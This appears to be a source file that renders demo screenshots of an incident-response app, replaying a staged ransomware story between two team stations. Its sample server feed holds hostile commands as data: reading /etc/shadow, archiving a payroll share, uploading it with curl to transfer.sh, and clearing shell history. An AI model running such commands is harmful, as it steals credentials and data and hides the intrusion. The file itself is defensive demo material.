// Runs the demo story through the real code with two stations in one
// process, and writes what each screen shows at every step to
// build/demo-<step>-<a|b>.ppm. tools/make-demo-gif.py lays them out with
// the hardware and makes docs/demo.gif.
//
// Messages are handed between the stations directly instead of through
// the relay; everything else (feed parsing, signing, risk, reporting,
// cutting with a stand-in command) is the code the stations run.

#include "../src/util.HC"
#include "../src/crypto.HC"
#include "../src/link.HC"
#include "../src/log.HC"
#include "../src/events.HC"
#include "../src/station.HC"
#include "../src/team.HC"
#include "../src/deadlines.HC"
#include "../src/sdl2.HC"
#include "../src/canvas.HC"
#include "../src/app.HC"

extern "c" I32 system(U8 *command);
extern "c" I32 setenv(U8 *name, U8 *value, I32 overwrite);
extern "c" U0 SDL_SetWindowSize(U0 *window, I32 w, I32 h);

U0 Deliver(Station *from, Station *to)
{
  U8 *msg = MAlloc(MSG_MAX);
  for (I64 i = 0; i < from->log->count; i++)
    StationReceive(to, msg, MakeMessage(from, &from->log->entries[i], msg));
  Free(msg);
}

U0 Shot(App *a, U8 *step, U8 *who)
{
  a->msg[0] = 0;
  Draw(a);
  U8 path[128];
  snprintf(path, 128, "build/demo-%s-%s.ppm", step, who);
  CanvasDump(a->cv, path);
}

// Each station sees the other as online, so the relay chip reads as it
// would with both connected.
U0 SeePeer(App *a, Station *other)
{
  a->team.peer_count = 1;
  MemCpy(a->team.peers[0].pk, other->pk, PK_BYTES);
  StrCpy(a->team.peers[0].name, other->name);
  a->team.peers[0].heard = time(NULL);
}

U8 *g_feed[8] = {
  "login\tmarcus\tfs-01\tssh from 10.0.4.22",
  "shell\tmarcus\tfs-01\tdf -h /srv",
  "fail\tadmin\tfs-01\tssh password from 185.220.101.7",
  "login\tsvc-backup\tfs-01\tssh from 185.220.101.7",
  "sudo\tsvc-backup\tfs-01\tcat /etc/shadow",
  "shell\tsvc-backup\tfs-01\ttar czf /tmp/.p.tgz /srv/shares/payroll",
  "shell\tsvc-backup\tfs-01\tcurl -T /tmp/.p.tgz https://transfer.sh/p.tgz",
  "shell\tsvc-backup\tfs-01\thistory -c"
};

I32 Main(I32 argc, U8 **argv)
{
  CryptoInit();
  system("rm -rf build/tmp-demo-a build/tmp-demo-b build/tmp-demo-cut");
  setenv("ARK_CUT_CMD", "touch build/tmp-demo-cut", 1);
  setenv("ARK_RESTORE_CMD", "rm -f build/tmp-demo-cut", 1);

  App *a = AppNew("build/tmp-demo-a", "/nonexistent", NULL);
  if (!CanvasOpen(a->cv, "demo", "assets/fonts")) {
    "canvas: %s\n", SDL_GetError();
    return 1;
  }
  SDL_SetWindowSize(a->cv->window, 1360, 900);
  CanvasResize(a->cv);

  // Manager: Dana on laptop A starts the incident.
  StationCreate(a->st, a->st->dir, "Dana Kessler", "correct horse battery");
  U8 *msg = MAlloc(MSG_MAX);
  StartIncident(a->st, "Ransomware on FS-01, Brightline Health", msg);
  a->mode = MODE_READY;
  a->link.fd = open("/dev/null", O_RDWR);

  // Worker: Marcus on laptop B joins and is approved.
  App *b = AppNew("build/tmp-demo-b", "/nonexistent", NULL);
  b->cv = a->cv;
  StationCreate(b->st, b->st->dir, "Marcus Hale", "another passphrase");
  b->mode = MODE_READY;
  b->link.fd = open("/dev/null", O_RDWR);
  MemCpy(b->st->keys[0], a->st->keys[0], KEY_BYTES);
  b->st->have_key[0] = TRUE;
  b->st->epoch = 0;
  a->team.join_pending = TRUE;
  MemCpy(a->team.join_pk, b->st->pk, PK_BYTES);
  StrCpy(a->team.join_name, "Marcus Hale");
  Approve(a);
  a->team.join_pending = FALSE;
  PostAndSend(a, KIND_NOTE, PHASE_DETECT, "Night shift reports slow shares on FS-01. Watching the server log.", 66);
  Deliver(a->st, b->st);
  PostAndSend(b, KIND_CHAT, PHASE_DETECT, "On it. I have the server log open.", 34);
  Deliver(b->st, a->st);
  SeePeer(a, b->st);
  SeePeer(b, a->st);
  a->scroll = 0;

  // 1. ark-watch on the server feeds station A; B receives the events.
  for (I64 i = 0; i < 8; i++)
    FeedEvent(a, g_feed[i], StrLen(g_feed[i]));
  Deliver(a->st, b->st);
  a->view = V_SERVER;
  b->view = V_SERVER;
  Shot(a, "1", "a");
  Shot(b, "1", "b");

  // 2. The worker picks the suspicious sudo command.
  RefreshRisk(b);
  I64 shadow = -1;
  for (I64 i = 0; i < b->st->log->count; i++)
    if (b->st->log->entries[i].kind == KIND_EVENT && strstr(b->st->log->entries[i].body, "/etc/shadow") != NULL)
      shadow = i;
  b->selected = shadow;
  b->server_filter = SF_SUS;
  Draw(b);
  for (I64 i = 0; i < b->hit_count; i++)
    if (b->hits[i].id == H_REPORT) {
      b->mx = b->hits[i].x + 20;
      b->my = b->hits[i].y + 10;
    }
  Shot(b, "2", "b");
  Shot(a, "2", "a");

  // 3. Report to manager: an alert naming the event; A's panel beeps.
  ReportEvent(b, shadow);
  Deliver(b->st, a->st);
  a->view = V_OVERVIEW;
  b->mx = 0;
  b->my = 0;
  Shot(a, "3", "a");
  Shot(b, "3", "b");

  // 4. Manager presses red: this machine goes offline, ARK keeps going.
  a->alerts_acked = AlertCount(a);
  CutNetwork(a, "panel button");
  Deliver(a->st, b->st);
  b->view = V_LOG;
  Shot(a, "4", "a");
  Shot(b, "4", "b");

  // 5. Backups done, attacker out: manager presses green.
  RestoreNetwork(a, "panel button");
  Deliver(a->st, b->st);
  a->view = V_NETWORK;
  Shot(a, "5", "a");
  Shot(b, "5", "b");

  Free(msg);
  "rendered demo\n";
  return 0;
}
